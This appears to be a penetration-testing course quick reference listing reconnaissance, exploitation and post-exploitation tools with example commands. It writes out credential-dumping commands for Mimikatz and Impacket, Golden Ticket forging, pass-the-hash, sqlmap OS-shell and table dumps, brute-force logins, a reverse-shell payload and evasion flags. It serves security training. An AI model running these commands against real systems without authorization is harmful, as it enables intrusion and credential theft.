# Module 9: Offensive Security Tooling - Quick Reference

## Reconnaissance Tools

### Nmap (Network Mapper)
- **Scan types**: `-sS` (SYN stealth), `-sT` (TCP connect), `-sU` (UDP), `-sV` (version), `-sC` (default scripts), `-A` (aggressive = OS + version + scripts + traceroute)
- **Output**: `-oN` (normal), `-oG` (grepable), `-oX` (XML), `-oA` (all formats)
- **Target specification**: `192.168.1.1`, `192.168.1.0/24`, `192.168.1.1-100`, `-iL targets.txt`
- **Port specification**: `-p 80,443`, `-p-` (all 65535), `-p 1-1000`, `--top-ports 1000`
- **Timing**: `-T0` (paranoid/slow) to `-T5` (insane/fast)
- **Evasion**: `-D RND:10` (decoy), `-f` (fragment), `--mtu`, `--spoof-mac`, `--source-port`
- **NSE scripts**: `--script=http-title`, `--script=vuln`, `--script=smb-enum-shares`, locate at `/usr/share/nmap/scripts/`
- **Examples**: `nmap -sC -sV -oA scan target.com`, `nmap -p- -sV --script=http-enum target.com`

### Masscan
- **Ultra-fast port scanner** (can scan entire internet in minutes)
- `masscan -p80,443 192.168.1.0/24 --rate=1000`
- Uses raw packets, similar to Nmap but much faster

### DNS Tools
- **dig**: `dig target.com ANY`, `dig target.com A`, `dig -x IP` (reverse), `dig @1.1.1.1 target.com` (use specific DNS)
- **nslookup**: `nslookup target.com`, `set type=mx`
- **dnsrecon**: `dnsrecon -d target.com` (zone transfer attempts, brute force subdomains)
- **dnsenum**: `dnsenum target.com` (comprehensive DNS enumeration)
- **Subfinder**: `subfinder -d target.com` (passive subdomain enumeration)

### Subdomain Enumeration
- **Passive**: crt.sh, VirusTotal, SecurityTrails, Shodan (no traffic to target)
- **Active**: DNS brute force (dnsrecon, gobuster dns, ffuf with DNS)
- **Tools**: subfinder, amass, assetfinder, findomain
- **Wordlists**: `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`

### Directory/File Enumeration
- **gobuster**: `gobuster dir -u http://target.com -w wordlist.txt -x php,txt,html`
- **ffuf**: `ffuf -u http://target.com/FUZZ -w wordlist.txt -c`, `ffuf -u http://target.com/admin/FUZZ.php -w wordlist.txt`
- **dirb**: `dirb http://target.com wordlist.txt`
- **dirbuster**: GUI tool (Java)
- **wfuzz**: `wfuzz -c -z file,wordlist.txt --hc 404 http://target.com/FUZZ`
- **Common wordlists**: `/usr/share/wordlists/dirbuster/`, `/usr/share/wordlists/dirb/`, `/usr/share/seclists/Discovery/Web-Content/`
- **Extensions**: `.php`, `.asp`, `.aspx`, `.jsp`, `.txt`, `.xml`, `.json`, `.bak`, `.old`, `.zip`, `.tar.gz`, `.env`, `.git/config`

### Web Technology Detection
- **whatweb**: `whatweb target.com` (identifies CMS, frameworks, server info)
- **wappalyzer**: Browser extension
- **builtwith**: Web service (builtwith.com)
- **retire.js**: Detects vulnerable JavaScript libraries

## Vulnerability Scanning

### Nessus / OpenVAS
- **Nessus**: Commercial vulnerability scanner (free tier available for home)
- **OpenVAS**: Open-source (now Greenbone Vulnerability Management)
- Scan types: Discovery, Basic Network Scan, Full Scan, Web Application Test
- Output: Prioritized list of vulnerabilities with CVSS scores, remediation

### Nuclei
- **Template-based scanner**: YAML templates define vulnerability checks
- `nuclei -u target.com` (default templates)
- `nuclei -u target.com -t cves/` (CVE-specific scans)
- `nuclei -u target.com -t exposures/ -o results.txt`
- Community-driven template repository (github.com/projectdiscovery/nuclei-templates)
- Extremely fast and extensible

### Nikto
- **Web server scanner**: Finds outdated versions, default files, misconfigurations
- `nikto -h http://target.com`
- `nikto -h https://target.com -ssl -port 443`
- Less stealthy, can crash services, use with caution

### WPScan
- **WordPress vulnerability scanner**: Enumerates plugins, themes, users, vulnerabilities
- `wpscan --url http://target.com`
- `wpscan --url http://target.com --enumerate u,vp,vt`
- Uses API key for vulnerability database access

## Exploitation Tools

### Metasploit Framework
- `msfconsole` - Interactive console
- `search type:exploit platform:windows keyword`
- `use exploit/multi/handler` - Generic listener
- `set payload windows/x64/meterpreter/reverse_tcp`
- `exploit -j` - Run as job
- `sessions -i ID` - Interact with session
- **Database**: `msfdb init`, `db_nmap`, `hosts`, `services`, `loot`, `creds`
- **Resource scripts**: Automate with `.rc` files

### Searchsploit (Exploit-DB)
- **Offline exploit database**: `searchsploit apache 2.4.49`
- `searchsploit -m exploit_path` - Mirror exploit to current dir
- `searchsploit -x exploit_path` - Examine exploit code
- `searchsploit --cve CVE-2021-41773` - Search by CVE

### SQLMap
- **Automated SQL injection tool**
- `sqlmap -u "http://target.com/page?id=1" --dbs` (enumerate databases)
- `sqlmap -u "http://target.com/page?id=1" -D database --tables`
- `sqlmap -u "http://target.com/page?id=1" -D database -T users --dump`
- `sqlmap -u "http://target.com/page?id=1" --os-shell` (get OS shell)
- `sqlmap -r request.txt` (use saved Burp request)
- `--batch` (auto-yes), `--random-agent`, `--tamper=space2comment` (WAF bypass)
- Post-authentication: `--cookie="PHPSESSID=xxx"` or `--data="user=admin&pass=admin"`

### Hydra
- **Online password brute-force**: `hydra -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"`
- Protocols: ssh, ftp, http-get/post, mysql, pop3, smb, rdp, vnc, telnet
- `hydra -L users.txt -P passwords.txt ssh://target.com`
- `-t` threads, `-V` verbose, `-f` exit on first find

### John the Ripper / Hashcat
- **Offline password cracking**
- **John**: `john --wordlist=rockyou.txt hash.txt`, `john --show hash.txt`
- **Hashcat**: `hashcat -m 1000 -a 0 hash.txt rockyou.txt` (NTLM mode 1000)
- Hash modes: 0 (MD5), 1000 (NTLM), 1800 (SHA512), 3200 (bcrypt), 13100 (Kerberos TGS)
- Rule-based: `hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule`

### Impacket
- **Python library for SMB/MSRPC protocols** (Windows exploitation)
- `psexec.py domain/user:pass@target` - Execute commands via SMB
- `smbexec.py domain/user:pass@target` - Semi-interactive shell via SMB
- `wmiexec.py domain/user:pass@target` - Shell via WMI
- `secretsdump.py domain/user:pass@target` - Dump hashes (DCSync)
- `GetUserSPNs.py domain/user:pass` - Find service accounts for Kerberoasting
- `GetNPUsers.py domain/ -usersfile users.txt` - AS-REP roast

## Post-Exploitation Tools

### BloodHound
- **AD attack path visualization**: Maps relationships between AD objects
- Collect data with SharpHound (Windows) or BloodHound.py (Linux)
- `bloodhound-python -u user -p pass -d domain.com -dc dc.domain.com -c All`
- Import data into BloodHound UI (Neo4j database)
- Queries: Find Domain Admins, Shortest Paths to Domain Admin, Find Computers with unconstrained delegation

### CrackMapExec
- **Swiss army knife for AD exploitation**
- `cme smb target.com -u user -p pass` - SMB enum
- `cme smb target.com -u user -p pass --shares` - List shares
- `cme smb target.com -u user -p pass -M mimikatz` - Run Mimikatz
- `cme smb target.com -u user -H hash --local-auth` - Pass-the-Hash
- Protocols: smb, ssh, winrm, ldap, mssql, rdp, ftp

### Mimikatz
- **Windows credential theft**: Extract plaintext passwords, hashes, Kerberos tickets
- `privilege::debug` (enable debug privilege)
- `sekurlsa::logonpasswords` (dump credentials from LSASS)
- `lsadump::dcsync /domain:domain.com /user:Administrator` (DCSync)
- `kerberos::golden /user:admin /domain:domain.com /sid:S-1-5-... /krbtgt:hash /ptt` (Golden Ticket)
- `sekurlsa::tickets /export` (export Kerberos tickets)

### PowerSploit / PowerView / Empire
- **PowerShell-based post-exploitation**
- PowerView: AD enumeration (`Get-NetUser`, `Get-NetComputer`, `Find-LocalAdminAccess`)
- PowerUp: Privilege escalation checks (`Invoke-AllChecks`)
- Empire: Post-exploitation framework with PowerShell agents (now Empire 4/Starkiller)

## Web Application Tools

### Burp Suite
- **Proxy**: Intercept and modify HTTP/S traffic
- **Repeater**: Manually re-send and modify individual requests
- **Intruder**: Automated parameter fuzzing (positions + payloads)
- **Decoder**: Encode/decode data (base64, URL, hex, etc.)
- **Comparer**: Compare response differences
- **Scanner**: Automated vulnerability scanning (Pro only)
- **Extender**: BApp store plugins (Autorize, ActiveScan++, JSON Web Tokens)

### OWASP ZAP
- Open-source alternative to Burp Suite
- Features: Automated scanner, active/passive scanning, HUD (heads-up display)
- `zap.sh` to start, ZAP API for automation

## Password Cracking Resources
- **Wordlists**: rockyou.txt (most famous), SecLists, CommonPasswords.txt, CrackStation
- **Rules**: best64.rule, OneRuleToRuleThemAll.rule, dive.rule
- **Mask attacks**: `?l?l?l?l?d?d` (4 lowercase + 2 digits)
- **Markov/chains**: princeprocessor, kwprocessor
- **GPU acceleration**: Hashcat with OpenCL/CUDA

## General Methodology
1. **Reconnaissance** - Domain/subdomain discovery, technology detection, email harvesting
2. **Scanning** - Port scan (nmap), directory enumeration, service version detection
3. **Vulnerability Assessment** - Automated scan (Nessus/Nuclei) + manual testing
4. **Exploitation** - Gain initial access (Metasploit, manual exploit)
5. **Post-Exploitation** - Privilege escalation, lateral movement, persistence, data exfiltration
6. **Reporting** - Document findings, risk rating, remediation steps
